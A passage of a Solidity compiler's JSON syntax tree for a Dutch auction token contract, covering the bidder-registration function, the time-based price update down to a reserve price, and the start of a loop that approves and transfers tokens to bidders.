pointer"}},"id":1345,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"5444:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"5434:29:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":1346,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5466:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"5434:33:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1348,"nodeType":"ExpressionStatement","src":"5434:33:7"},{"expression":{"id":1353,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"id":1349,"name":"newBidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1312,"src":"5477:9:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder storage pointer"}},"id":1351,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"5487:9:7","memberName":"refundEth","nodeType":"MemberAccess","referencedDeclaration":1051,"src":"5477:19:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":1352,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5499:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"5477:23:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1354,"nodeType":"ExpressionStatement","src":"5477:23:7"},{"expression":{"id":1359,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1355,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"5510:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1357,"indexExpression":{"id":1356,"name":"totalNumBidders","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1011,"src":"5522:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"5510:28:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":1358,"name":"newBidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1312,"src":"5541:9:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder storage pointer"}},"src":"5510:40:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1360,"nodeType":"ExpressionStatement","src":"5510:40:7"},{"eventCall":{"arguments":[{"expression":{"id":1362,"name":"newBidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1312,"src":"5593:9:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder storage pointer"}},"id":1363,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"5603:8:7","memberName":"bidderID","nodeType":"MemberAccess","referencedDeclaration":1043,"src":"5593:18:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"id":1364,"name":"newBidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1312,"src":"5625:9:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder storage pointer"}},"id":1365,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"5635:13:7","memberName":"walletAddress","nodeType":"MemberAccess","referencedDeclaration":1045,"src":"5625:23:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"expression":{"id":1366,"name":"newBidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1312,"src":"5662:9:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder storage pointer"}},"id":1367,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"5672:8:7","memberName":"bidValue","nodeType":"MemberAccess","referencedDeclaration":1047,"src":"5662:18:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1361,"name":"addBidderEvent","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1167,"src":"5565:14:7","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_uint256_$_t_address_$_t_uint256_$returns$__$","typeString":"function (uint256,address,uint256)"}},"id":1368,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5565:125:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1369,"nodeType":"EmitStatement","src":"5560:130:7"},{"expression":{"id":1371,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"5700:17:7","subExpression":{"id":1370,"name":"totalNumBidders","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1011,"src":"5700:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1372,"nodeType":"ExpressionStatement","src":"5700:17:7"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":1373,"name":"calculate","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1767,"src":"5727:9:7","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$__$returns$__$","typeString":"function ()"}},"id":1374,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5727:11:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1375,"nodeType":"ExpressionStatement","src":"5727:11:7"}]},"documentation":{"id":1275,"nodeType":"StructuredDocumentation","src":"4753:44:7","text":" public functions\n "},"functionSelector":"1f8cdb04","id":1377,"implemented":true,"kind":"function","modifiers":[{"id":1278,"kind":"modifierInvocation","modifierName":{"id":1277,"name":"notOwner","nameLocations":["4839:8:7"],"nodeType":"IdentifierPath","referencedDeclaration":1124,"src":"4839:8:7"},"nodeType":"ModifierInvocation","src":"4839:8:7"},{"id":1280,"kind":"modifierInvocation","modifierName":{"id":1279,"name":"AuctionOpen","nameLocations":["4848:11:7"],"nodeType":"IdentifierPath","referencedDeclaration":1136,"src":"4848:11:7"},"nodeType":"ModifierInvocation","src":"4848:11:7"}],"name":"addBidder","nameLocation":"4812:9:7","nodeType":"FunctionDefinition","parameters":{"id":1276,"nodeType":"ParameterList","parameters":[],"src":"4821:2:7"},"returnParameters":{"id":1281,"nodeType":"ParameterList","parameters":[],"src":"4860:0:7"},"scope":1950,"src":"4803:992:7","stateMutability":"payable","virtual":false,"visibility":"public"},{"body":{"id":1438,"nodeType":"Block","src":"5838:451:7","statements":[{"condition":{"id":1381,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"!","prefix":true,"src":"5852:13:7","subExpression":{"id":1380,"name":"prematureEnd","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1031,"src":"5853:12:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1437,"nodeType":"IfStatement","src":"5848:435:7","trueBody":{"id":1436,"nodeType":"Block","src":"5866:417:7","statements":[{"expression":{"id":1403,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1382,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"5876:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":1402,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":1385,"name":"startPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1013,"src":"5910:10:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1384,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5903:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":1383,"name":"int256","nodeType":"ElementaryTypeName","src":"5903:6:7","typeDescriptions":{}}},"id":1386,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5903:18:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":1401,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1395,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1392,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":1389,"name":"block","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-4,"src":"5944:5:7","typeDescriptions":{"typeIdentifier":"t_magic_block","typeString":"block"}},"id":1390,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"5950:9:7","memberName":"timestamp","nodeType":"MemberAccess","src":"5944:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"id":1391,"name":"startTime","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1021,"src":"5962:9:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5944:27:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":1393,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"5943:29:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"hexValue":"3630","id":1394,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5975:2:7","typeDescriptions":{"typeIdentifier":"t_rational_60_by_1","typeString":"int_const 60"},"value":"60"},"src":"5943:34:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1388,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5936:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":1387,"name":"int256","nodeType":"ElementaryTypeName","src":"5936:6:7","typeDescriptions":{}}},"id":1396,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5936:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"arguments":[{"id":1399,"name":"changePerMin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1028,"src":"6000:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1398,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5993:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":1397,"name":"int256","nodeType":"ElementaryTypeName","src":"5993:6:7","typeDescriptions":{}}},"id":1400,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5993:20:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"5936:77:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"5903:110:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"5876:137:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"id":1404,"nodeType":"ExpressionStatement","src":"5876:137:7"},{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1414,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":1407,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1405,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"6028:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"<=","rightExpression":{"hexValue":"30","id":1406,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6044:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"6028:17:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"||","rightExpression":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":1413,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1408,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"6049:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"<=","rightExpression":{"arguments":[{"id":1411,"name":"reservePrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1015,"src":"6072:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1410,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6065:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":1409,"name":"int256","nodeType":"ElementaryTypeName","src":"6065:6:7","typeDescriptions":{}}},"id":1412,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6065:20:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"6049:36:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"6028:57:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1423,"nodeType":"IfStatement","src":"6024:123:7","trueBody":{"id":1422,"nodeType":"Block","src":"6087:60:7","statements":[{"expression":{"id":1420,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1415,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"6101:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":1418,"name":"reservePrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1015,"src":"6123:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1417,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6116:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":1416,"name":"int256","nodeType":"ElementaryTypeName","src":"6116:6:7","typeDescriptions":{}}},"id":1419,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6116:20:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"6101:35:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"id":1421,"nodeType":"ExpressionStatement","src":"6101:35:7"}]}},{"eventCall":{"arguments":[{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1428,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":1425,"name":"block","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-4,"src":"6199:5:7","typeDescriptions":{"typeIdentifier":"t_magic_block","typeString":"block"}},"id":1426,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"6205:9:7","memberName":"timestamp","nodeType":"MemberAccess","src":"6199:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"id":1427,"name":"startTime","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1021,"src":"6217:9:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"6199:27:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":1429,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"6198:29:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"arguments":[{"id":1432,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"6249:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":1431,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6241:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":1430,"name":"uint256","nodeType":"ElementaryTypeName","src":"6241:7:7","typeDescriptions":{}}},"id":1433,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6241:21:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1424,"name":"updateCurrentPriceEvent","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1173,"src":"6161:23:7","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (uint256,uint256)"}},"id":1434,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6161:111:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1435,"nodeType":"EmitStatement","src":"6156:116:7"}]}}]},"functionSelector":"aa9d9bd6","id":1439,"implemented":true,"kind":"function","modifiers":[],"name":"updateCurrentPrice","nameLocation":"5810:18:7","nodeType":"FunctionDefinition","parameters":{"id":1378,"nodeType":"ParameterList","parameters":[],"src":"5828:2:7"},"returnParameters":{"id":1379,"nodeType":"ParameterList","parameters":[],"src":"5838:0:7"},"scope":1950,"src":"5801:488:7","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":1511,"nodeType":"Block","src":"6324:679:7","statements":[{"body":{"id":1509,"nodeType":"Block","src":"6377:620:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1457,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"baseExpression":{"id":1452,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"6395:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1454,"indexExpression":{"id":1453,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1443,"src":"6407:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"6395:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1455,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"6410:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"6395:34:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":1456,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6432:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"6395:38:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1508,"nodeType":"IfStatement","src":"6391:596:7","trueBody":{"id":1507,"nodeType":"Block","src":"6435:552:7","statements":[{"expression":{"arguments":[{"expression":{"baseExpression":{"id":1461,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"6490:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1463,"indexExpression":{"id":1462,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1443,"src":"6502:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"6490:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1464,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"6505:13:7","memberName":"walletAddress","nodeType":"MemberAccess","referencedDeclaration":1045,"src":"6490:28:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1472,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"baseExpression":{"id":1465,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"6540:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1467,"indexExpression":{"id":1466,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1443,"src":"6552:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"6540:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1468,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"6555:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"6540:34:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"commonType":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"},"id":1471,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":1469,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6577:2:7","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3138","id":1470,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6583:2:7","typeDescriptions":{"typeIdentifier":"t_rational_18_by_1","typeString":"int_const 18"},"value":"18"},"src":"6577:8:7","typeDescriptions":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"}},"src":"6540:45:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":1458,"name":"DAToken","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1034,"src":"6453:7:7","typeDescriptions":{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"}},"id":1460,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"6461:7:7","memberName":"approve","nodeType":"MemberAccess","referencedDeclaration":450,"src":"6453:15:7","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$","typeString":"function (address,uint256) external returns (bool)"}},"id":1473,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6453:150:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1474,"nodeType":"ExpressionStatement","src":"6453:150:7"},{"expression":{"arguments":[{"arguments":[{"id":1480,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"6671:4:7","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}],"id":1479,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6663:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1478,"name":"address","nodeType":"ElementaryTypeName","src":"6663:7:7","typeDescriptions":{}}},"id":1481,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6663:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"expression":{"baseExpression":{"id":1482,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"6698:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1484,"indexExpression":{"id":1483,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1443,"src":"6710:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"6698:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1485,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"6713:13:7","memberName":"walletAddress","nodeType":"MemberAccess","referencedDeclaration":1045,"src":"6698:28:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1493,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"baseExpression":{"id":1486,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"6748:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder 